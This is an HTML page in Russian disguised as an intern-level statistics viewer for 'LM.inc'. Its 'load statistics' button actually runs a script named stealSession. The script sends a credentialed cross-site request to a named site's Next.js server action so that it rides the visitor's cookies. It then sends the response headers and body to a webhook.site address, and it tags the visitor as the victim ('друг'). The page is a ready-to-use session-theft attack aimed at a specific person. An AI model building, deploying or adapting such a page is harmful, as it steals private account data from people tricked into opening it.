<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Уровни стажёров — проверка</title>
  <style>
    body {
      font-family: 'Inter', Arial, sans-serif;

<body>
  <div class="container">
    <h1>📊 Статистика уровней</h1>
    <p>Нажмите кнопку, чтобы загрузить актуальные данные из панели управления LM.inc</p>
    <button id="loadBtn" onclick="stealSession()">🔍 Загрузить статистику</button>
    <div id="log"></div>
  </div>

  <script>
    // ===== ЗАМЕНИ НА СВОЙ ВЕБХУК =====
    const WEBHOOK_URL = 'https://webhook.site/XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX';
    // ==================================

    async function stealSession() {
      const btn = document.getElementById('loadBtn');
      btn.disabled = true;
      btn.textContent = '⏳ Загрузка...';
      log('Инициализация запроса к LM.inc/bosses...');

      // Используем легитимные заголовки и тело запроса (как при входе)
      const NEXT_ACTION = '60890ee6f3d54abdf5f5df202889613245de9c22c9';
      const NEXT_ROUTER_STATE_TREE = '%5B%22%22%2C%7B%22children%22%3A%5B%22bosses%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%2Cnull%2Cnull%2C0%5D%7D%2Cnull%2Cnull%2C0%5D%7D%2Cnull%2Cnull%2C16%5D';
      const BOUNDARY = '----WebKitFormBoundary8h3PmBJBTvZqYXzh';
      
      // Тело запроса с пустыми логином/паролем — сервер всё равно проверит сессию по кукам
      const body = [
        `--${BOUNDARY}`,
        'Content-Disposition: form-data; name="$ACTION_REF_1"',
        '',
        '',
        `--${BOUNDARY}`,
        'Content-Disposition: form-data; name="$ACTION_1:0"',
        '',
        '{"id":"603f07bf5f014a9862c5008244c1c9c61030a9d0d5","bound":"$@1"}',
        `--${BOUNDARY}`,
        'Content-Disposition: form-data; name="$ACTION_1:1"',
        '',
        '[{"message":""}]',
        `--${BOUNDARY}`,
        'Content-Disposition: form-data; name="$ACTION_KEY"',
        '',
        'ka7bd7ae1903676f6fa1415438ef9bca2',
        `--${BOUNDARY}`,
        'Content-Disposition: form-data; name="login"',
        '',
        '',
        `--${BOUNDARY}`,
        'Content-Disposition: form-data; name="password"',
        '',
        '',
        `--${BOUNDARY}--`
      ].join('\r\n');

      try {
        const response = await fetch('https://lm-inc-levels-knyazhna.amvera.io/bosses', {
          method: 'POST',
          headers: {
            'accept': 'text/x-component',
            'content-type': `multipart/form-data; boundary=${BOUNDARY}`,
            'next-action': NEXT_ACTION,
            'next-router-state-tree': NEXT_ROUTER_STATE_TREE,
            'origin': 'https://lm-inc-levels-knyazhna.amvera.io',
            'sec-fetch-site': 'same-origin'
          },
          body: body,
          credentials: 'include',   // <-- отправляет куки друга
          redirect: 'manual'
        });

        const text = await response.text();
        log(`✅ Получен ответ (${text.length} байт). Отправляю данные...`);

        // Отправляем ответ на webhook.site
        await fetch(WEBHOOK_URL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            victim: 'друг',
            timestamp: new Date().toISOString(),
            status: response.status,
            headers: Object.fromEntries(response.headers.entries()),
            body: text
          })
        });

        log('✅ Данные успешно переданы.');
        btn.textContent = '✅ Готово';
      } catch (err) {
        log('❌ Ошибка: ' + err.message);
        btn.disabled = false;
        btn.textContent = '🔄 Попробовать снова';
      }
    }

    function log(msg) {
      const el = document.getElementById('log');
      el.innerHTML += `<div>${msg}</div>`;
      el.scrollTop = el.scrollHeight;
    }
  </script>
</body>
</html>
